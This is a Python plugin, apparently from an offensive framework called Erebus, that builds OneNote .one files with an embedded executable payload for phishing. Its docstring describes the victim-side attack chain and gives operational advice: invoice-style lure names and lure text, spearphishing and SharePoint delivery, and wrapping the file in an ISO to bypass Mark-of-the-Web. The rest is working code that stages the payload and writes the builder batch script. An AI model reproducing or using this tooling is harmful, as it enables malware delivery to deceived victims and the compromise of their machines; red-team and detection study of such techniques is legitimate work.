"""
Erebus Plugin - OneNote Trigger
Author: Whispergate
Description: Creates OneNote (.one) section files with an embedded payload attachment.

Build flow:
    1. Builder calls create_onenote_trigger() → stages payload into onenote_src/
       and writes build_onenote.bat.
    2. Operator runs build_onenote.bat on a Windows host (requires OneNote + pywin32).
       The bat calls: python erebus_helper.py onenote --payload <name> --output document.one
    3. The output document.one is the delivery artefact.

Attack chain:
    Victim opens document.one → OneNote shows embedded attachment icon →
    victim double-clicks → OneNote warns "file may be unsafe, open anyway?" →
    victim clicks OK → payload executes.

OPSEC Notes:
    - OneNote shows a single security dialog (less friction than Office macros).
    - Name the attachment to match the lure: "Invoice_2024.exe", "PO-3391.bat"
    - Delivery: spearphish (.one attached to email), SharePoint link, ISO/VHD.
    - Combine with Electron container (outer ISO) to bypass MOTW on the .one file.
    - Detection: OneNote spawning child process via embedded file - well-known
      (T1566.001 + T1204.002). EDRs inspect InsertedFile paths and exec lineage.

Reference: https://attack.mitre.org/techniques/T1566/001/
"""

import shutil
import textwrap
from pathlib import Path
from typing import Dict, Callable, Optional

try:
    from erebus_wrapper.erebus.modules.plugin_base import ErebusPlugin, PluginMetadata, PluginCategory
except ImportError:
    from plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


# ---------------------------------------------------------------------------
# .bat runner template - calls Erebus.Helper via erebus_helper.py onenote
# ---------------------------------------------------------------------------

_BAT_TEMPLATE = textwrap.dedent(r"""
@echo off
setlocal
REM =========================================================
REM build_onenote.bat - OneNote trigger builder
REM Requires: Windows with Microsoft OneNote installed,
REM           Python 3.8+, pywin32 (pip install pywin32)
REM =========================================================

set SRC_DIR=%~dp0onenote_src
set HELPER=%~dp0Erebus.Helper\erebus_helper.py
set PAYLOAD={attachment_name}
set OUTPUT=%~dp0document.one

echo [*] Building OneNote trigger: %OUTPUT%

python "%HELPER%" onenote ^
    --payload "%SRC_DIR%\%PAYLOAD%" ^
    --attachment-name "{attachment_name}" ^
    --output "%OUTPUT%" ^
    --note-title "{note_title}" ^
    --lure-text "{lure_text}"

if %ERRORLEVEL% EQU 0 (
    echo [+] document.one ready for delivery.
) else (
    echo [-] Build failed. Ensure Microsoft OneNote is installed and pywin32 is available.
    exit /b 1
)
endlocal
""").lstrip()


# ---------------------------------------------------------------------------
# Plugin class
# ---------------------------------------------------------------------------

class OneNoteTriggerPlugin(ErebusPlugin):
    """OneNote (.one) section file with embedded payload attachment."""

    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name="onenote_trigger",
            version="1.0.0",
            author="Whispergate",
            description="Creates a OneNote .one file with an embedded payload (deferred Windows build)",
            category=PluginCategory.TRIGGER,
            enabled=True,
        )

    def register(self) -> Dict[str, Callable]:
        return {
            "create_onenote_trigger": self.create_onenote_trigger,
        }

    def validate(self) -> tuple:
        return (True, None)

    def on_load(self):
        print("[Plugin] OneNote Trigger plugin loaded")

    # ------------------------------------------------------------------

    def create_onenote_trigger(
        self,
        payload_path: Path,
        payload_dir: Optional[Path] = None,
        attachment_name: str = "Invoice.exe",
        note_title: str = "Invoice",
        lure_text: str = "Please double-click the attachment below to view the document.",
        output_filename: str = "document.one",
    ) -> Path:
        """Stage a OneNote trigger project directory and emit build_onenote.bat.

        Deferred build: the operator runs build_onenote.bat on a Windows host
        which calls `python erebus_helper.py onenote ...` to produce document.one
        via the OneNote COM API. Follows the same pattern as CHM/XLL triggers.

        Returns:
            Path to the onenote_src/ staging directory (indicates success to builder.py).
        """
        if payload_dir is None:
            payload_dir = Path(__file__).resolve().parents[2] / "agent_code" / "payload"
        payload_dir = Path(payload_dir)

        src_dir = payload_dir / "onenote_src"
        src_dir.mkdir(parents=True, exist_ok=True)

        payload_path = Path(payload_path)
        staged_payload = src_dir / attachment_name
        if payload_path.exists():
            shutil.copy2(payload_path, staged_payload)
        else:
            staged_payload.write_bytes(b"\x4d\x5a")  # placeholder; operator replaces

        bat_content = _BAT_TEMPLATE.format(
            attachment_name=attachment_name,
            note_title=note_title,
            lure_text=lure_text,
        )
        bat_path = payload_dir / "build_onenote.bat"
        bat_path.write_text(bat_content, encoding="utf-8", newline="\r\n")

        print(f"[OneNote] Staged trigger source → {src_dir}")
        print(f"[OneNote] Run build_onenote.bat on Windows to produce document.one")

        return src_dir


# Module-level instance for auto-discovery
_plugin = OneNoteTriggerPlugin()


if __name__ == "__main__":
    import tempfile, os
    m = _plugin.get_metadata()
    print(f"[*] {m.name} v{m.version} ({m.category.value})")
    for fn in sorted(_plugin.register()):
        print(f"    - {fn}")
    ok, err = _plugin.validate()
    print("[+] Validation passed" if ok else f"[-] {err}")

    # Quick smoke test: stage into a temp dir
    with tempfile.TemporaryDirectory() as td:
        td = Path(td)
        dummy_payload = td / "erebus.exe"
        dummy_payload.write_bytes(b"\x4d\x5a" + b"\x00" * 100)
        result = _plugin.create_onenote_trigger(
            payload_path=dummy_payload,
            payload_dir=td / "payload",
            attachment_name="Invoice.exe",
        )
        print(f"[+] Staged: {result}")
        for p in sorted(result.parent.rglob("*")):
            print(f"    {p.relative_to(td)}")
